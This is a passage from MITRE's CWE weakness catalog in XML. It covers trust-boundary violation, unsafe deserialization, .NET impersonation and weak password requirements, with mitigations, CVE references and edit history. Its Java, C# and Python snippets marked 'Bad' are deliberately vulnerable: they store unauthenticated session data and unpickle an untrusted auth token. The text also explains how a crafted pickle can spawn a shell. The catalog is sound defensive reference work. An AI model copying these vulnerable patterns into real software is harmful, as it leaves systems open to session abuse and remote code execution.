            <Related_Weakness Nature="ChildOf" CWE_ID="664" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code accepts an HTTP request and stores the username parameter in the HTTP session object before checking to ensure that the user has been authenticated.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>usrname = request.getParameter("usrname");<xhtml:br/>if (session.getAttribute(ATTR_USR) == null) {<xhtml:div style="margin-left:1em;">session.setAttribute(ATTR_USR, usrname);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="C#">
                  <xhtml:div>usrname = request.Item("usrname");<xhtml:br/>if (session.Item(ATTR_USR) == null) {<xhtml:div style="margin-left:1em;">session.Add(ATTR_USR, usrname);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Without well-established and maintained trust boundaries, programmers will inevitably lose track of which pieces of data have been validated and which have not. This confusion will eventually allow some data to be used without first being validated.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Trust Boundary Violation</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-6"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Demonstrative_Example, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Description, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="502" Name="Deserialization of Untrusted Data" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.</Description>
         <Extended_Description>
            <xhtml:p>It is often convenient to serialize objects for communication or to save them for later use. However, deserialized data or code can often be modified without using the provided accessor functions if it does not use cryptography to protect itself. Furthermore, any cryptography would still be client-side security -- which is a dangerous security assumption.</xhtml:p>
            <xhtml:p>Data that is untrusted can not be trusted to be well-formed.</xhtml:p>
            <xhtml:p>When developers place no restrictions on "gadget chains," or series of instances and method invocations that can self-execute during the deserialization process (i.e., before the object is returned to the caller), it is sometimes possible for attackers to leverage them to perform unauthorized actions, like generating a shell.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="913" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="913" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="915" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Name="Java" Prevalence="Undetermined"/>
            <Language Name="Ruby" Prevalence="Undetermined"/>
            <Language Name="PHP" Prevalence="Undetermined"/>
            <Language Name="Python" Prevalence="Undetermined"/>
            <Language Name="JavaScript" Prevalence="Undetermined"/>
            <Technology Class="ICS/OT" Prevalence="Often"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>Serialization and deserialization refer to the process of taking program-internal object-related data, packaging it in a way that allows the data to be externally stored or transferred ("serialization"), then extracting the serialized data to reconstruct the original object ("deserialization").</Background_Detail>
         </Background_Details>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Marshaling, Unmarshaling</Term>
               <Description>Marshaling and unmarshaling are effectively synonyms for serialization and deserialization, respectively.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Pickling, Unpickling</Term>
               <Description>In Python, the "pickle" functionality is used to perform serialization and deserialization.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>PHP Object Injection</Term>
               <Description>Some PHP application researchers use this term when attacking unsafe use of the unserialize() function; but it is also used for CWE-915.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
               <Impact>Unexpected State</Impact>
               <Note>Attackers can modify unexpected objects or data that was assumed to be safe from modification.</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Resource Consumption (CPU)</Impact>
               <Note>If a function is making an assumption on when to terminate, based on a sentry in a string, it could easily never terminate.</Note>
            </Consequence>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Varies by Context</Impact>
               <Note>The consequences can vary widely, because it depends on which objects or methods are being deserialized, and how they are used. Making an assumption that the code in the deserialized object is valid is dangerous and can enable exploitation.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Description>If available, use the signing/sealing features of the programming language to assure that deserialized data has not been tainted. For example, a hash-based message authentication code (HMAC) could be used to ensure that data has not been modified.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>When deserializing data, populate a new object rather than just deserializing. The result is that the data flows through safe input validation and that the functions are safe.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Explicitly define a final object() to prevent deserialization.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Make fields transient to protect them from deserialization.</xhtml:p>
                  <xhtml:p>An attempt to serialize and then deserialize a class containing transient fields will result in NULLs where the transient data should be. This is an excellent way to prevent time, environment-based, or sensitive variables from being carried over and used improperly.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Avoid having unnecessary types or gadgets available that can be leveraged for malicious ends. This limits the potential for unintended or unauthorized types and gadgets to be leveraged by the attacker. Add only acceptable classes to an allowlist. Note: new gadgets are constantly being discovered, so this alone is not a sufficient mitigation.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This code snippet deserializes an object from a file and uses it as a UI button:</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>try {<xhtml:div style="margin-left:1em;">File file = new File("object.obj");<xhtml:br/>ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));<xhtml:br/>javax.swing.JButton button = (javax.swing.JButton) in.readObject();<xhtml:br/>in.close();</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This code does not attempt to verify the source or contents of the file before deserializing it. An attacker may be able to replace the intended file with a file that contains arbitrary malicious code which will be executed when the button is pressed.</Body_Text>
               <Body_Text>To mitigate this, explicitly define final readObject() to prevent deserialization. An example of this is:</Body_Text>
               <Example_Code Nature="Good" Language="Java">
                  <xhtml:div>private final void readObject(ObjectInputStream in) throws java.io.IOException {<xhtml:br/>throw new java.io.IOException("Cannot be deserialized"); }</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In Python, the Pickle library handles the serialization and deserialization processes. In this example derived from [REF-467], the code receives and parses data, and afterwards tries to authenticate a user based on validating a token.</Intro_Text>
               <Example_Code Nature="Bad" Language="Python">
                  <xhtml:div>try {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>class ExampleProtocol(protocol.Protocol):<xhtml:br/>def dataReceived(self, data):<xhtml:br/>
                           <xhtml:br/># Code that would be here would parse the incoming data<xhtml:br/># After receiving headers, call confirmAuth() to authenticate<xhtml:br/>
                           <xhtml:br/>def confirmAuth(self, headers):<xhtml:br/>try:<xhtml:br/>token = cPickle.loads(base64.b64decode(headers['AuthToken']))<xhtml:br/>if not check_hmac(token['signature'], token['data'], getSecretKey()):<xhtml:br/>raise AuthFail<xhtml:br/>self.secure_data = token['data']<xhtml:br/>except:<xhtml:br/>raise AuthFail</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Unfortunately, the code does not verify that the incoming data is legitimate. An attacker can construct a illegitimate, serialized object "AuthToken" that instantiates one of Python's subprocesses to execute arbitrary commands. For instance,the attacker could construct a pickle that leverages Python's subprocess module, which spawns new processes and includes a number of arguments for various uses. Since Pickle allows objects to define the process for how they should be unpickled, the attacker can direct the unpickle process to call Popen in the subprocess module and execute /bin/sh.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2019-12799</Reference>
               <Description>chain: bypass of untrusted deserialization issue (CWE-502) by using an assumed-trusted class (CWE-183)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-12799</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2015-8103</Reference>
               <Description>Deserialization issue in commonly-used Java library allows remote execution.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2015-8103</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2015-4852</Reference>
               <Description>Deserialization issue in commonly-used Java library allows remote execution.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2015-4852</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2013-1465</Reference>
               <Description>Use of PHP unserialize function on untrusted input allows attacker to modify application configuration.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2013-1465</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-3527</Reference>
               <Description>Use of PHP unserialize function on untrusted input in content management system might allow code execution.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-3527</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-0911</Reference>
               <Description>Use of PHP unserialize function on untrusted input in content management system allows code execution using a crafted cookie value.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-0911</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-0911</Reference>
               <Description>Content management system written in PHP allows unserialize of arbitrary objects, possibly allowing code execution.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-0911</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2011-2520</Reference>
               <Description>Python script allows local users to execute code via pickled data.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2011-2520</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-4406</Reference>
               <Description>Unsafe deserialization using pickle in a Python script.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-4406</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0791</Reference>
               <Description>Web browser allows execution of native methods via a crafted string to a JavaScript function that deserializes the string.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0791</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Deserialization of untrusted data</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>SER01-J</Entry_ID>
               <Entry_Name>Do not deviate from the proper signatures of serialization methods</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>SER03-J</Entry_ID>
               <Entry_Name>Do not serialize unencrypted, sensitive data</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>SER06-J</Entry_ID>
               <Entry_Name>Make defensive copies of private mutable components during deserialization</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>SER08-J</Entry_ID>
               <Entry_Name>Do not use the default serialized form for implementation defined invariants</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP25</Entry_ID>
               <Entry_Name>Tainted input to variable</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="586"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-18"/>
            <Reference External_Reference_ID="REF-461"/>
            <Reference External_Reference_ID="REF-462"/>
            <Reference External_Reference_ID="REF-463"/>
            <Reference External_Reference_ID="REF-464"/>
            <Reference External_Reference_ID="REF-465"/>
            <Reference External_Reference_ID="REF-466"/>
            <Reference External_Reference_ID="REF-467"/>
            <Reference External_Reference_ID="REF-468"/>
         </References>
         <Notes>
            <Note Type="Maintenance">The relationships between CWE-502 and CWE-915 need further exploration. CWE-915 is more narrowly scoped to object modification, and is not necessarily used for deserialization.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CLASP</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Description, Other_Notes, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms, Background_Details, Common_Consequences, Maintenance_Notes, Observed_Examples, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Observed_Examples, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Modes_of_Introduction, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Observed_Examples, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="520" Name=".NET Misconfiguration: Use of Impersonation" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>Allowing a .NET application to run at potentially escalated levels of access to the underlying operating and file systems can be dangerous and result in various forms of attacks.</Description>
         <Extended_Description>.NET server applications can optionally execute using the identity of the user authenticated to the client. The intention of this functionality is to bypass authentication and access control checks within the .NET application code. Authentication is done by the underlying web server (Microsoft Internet Information Service IIS), which passes the authenticated token, or unauthenticated anonymous token, to the .NET application. Using the token to impersonate the client, the application then relies on the settings within the NTFS directories and files to control access. Impersonation enables the application, on the server running the .NET application, to both execute code and access resources in the context of the authenticated and authorized user.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="266" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Operation</Phase>
               <Description>Run the application with limited privilege to the underlying operating and file system.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Content_History>
            <Submission>
               <Submission_Name>Anonymous Tool Vendor (under NDA)</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Description, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">.NET Misconfiguration: Impersonation</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="521" Name="Weak Password Requirements" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product does not require that users should have strong passwords, which makes it easier for attackers to compromise user accounts.</Description>
		 <Extended_Description>Authentication mechanisms often rely on a memorized secret (also known as a password) to provide an assertion of identity for a user of a system. It is therefore important that this password be of sufficient complexity and impractical for an adversary to guess. The specific requirements around how complex a password needs to be depends on the type of system being protected. Selecting the correct password requirements and enforcing them through implementation are critical to the overall success of the authentication mechanism.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="1391" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
			   <Note>Not enforcing the password policy stated in a products design can allow users to create passwords that do not provide the necessary level of protection.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>An attacker could easily guess user passwords and gain access user accounts.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                 <xhtml:p>A product's design should require adherance to an appropriate password policy. Specific password requirements depend strongly on contextual factors, but it is recommended to contain the following attributes:</xhtml:p>
                 <xhtml:ul>
                   <xhtml:li>Enforcement of a minimum and maximum length</xhtml:li>
                   <xhtml:li>Restrictions against password reuse</xhtml:li>
                   <xhtml:li>Restrictions against using common passwords</xhtml:li>
                   <xhtml:li>Restrictions against using contextual string in the password (e.g., user id, app name)</xhtml:li>
                 </xhtml:ul>
                 <xhtml:p>Depending on the threat model, the password policy may include several additional attributes.</xhtml:p>
                 <xhtml:ul>
                   <xhtml:li>Complex passwords requiring mixed character sets (alpha, numeric, special, mixed case)
                     <xhtml:ul>
                       <xhtml:li>Increasing the range of characters makes the password harder to crack and may be appropriate for systems relying on single factor authentication.</xhtml:li>
                       <xhtml:li>Unfortunately, a complex password may be difficult to memorize, encouraging a user to select a short password or to incorrectly manage the password (write it down).</xhtml:li>
                       <xhtml:li>Another disadvantage of this approach is that it often does not result in a significant increases in overal password complexity due to people's predictable usage of various symbols.</xhtml:li>
                     </xhtml:ul>
                   </xhtml:li>
                   <xhtml:li>Large Minimum Length (encouraging passphrases instead of passwords)
                     <xhtml:ul>
                       <xhtml:li>Increasing the number of characters makes the password harder to crack and may be appropriate for systems relying on single factor authentication.</xhtml:li>
                       <xhtml:li>A disadvantage of this approach is that selecting a good passphrase is not easy and poor passwords can still be generated. Some prompting may be needed to encourage long un-predictable passwords.</xhtml:li>
                     </xhtml:ul>
                   </xhtml:li>
                   <xhtml:li>Randomly Chosen Secrets
                     <xhtml:ul>
                       <xhtml:li>Generating a password for the user can help make sure that length and complexity requirements are met, and can result in secure passwords being used.</xhtml:li>
                       <xhtml:li>A disadvantage of this approach is that the resulting password or passpharse may be too difficult to memorize, encouraging them to be written down.</xhtml:li>
                     </xhtml:ul>
                   </xhtml:li>
                   <xhtml:li>Password Expiration
                     <xhtml:ul>
                       <xhtml:li>Requiring a periodic password change can reduce the time window that an adversary has to crack a password, while also limiting the damage caused by password exposures at other locations.</xhtml:li>
					   <xhtml:li>Password expiration may be a good mitigating technique when long complex passwords are not desired.</xhtml:li>
                     </xhtml:ul>
                   </xhtml:li>
                 </xhtml:ul>
                 <xhtml:p>See NIST 800-63B [REF-1053] for further information on password requirements.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Consider a second
                 authentication factor beyond the password, which prevents the
                 password from being a single point of failure. See CWE-308 for
                 further information.</Description>
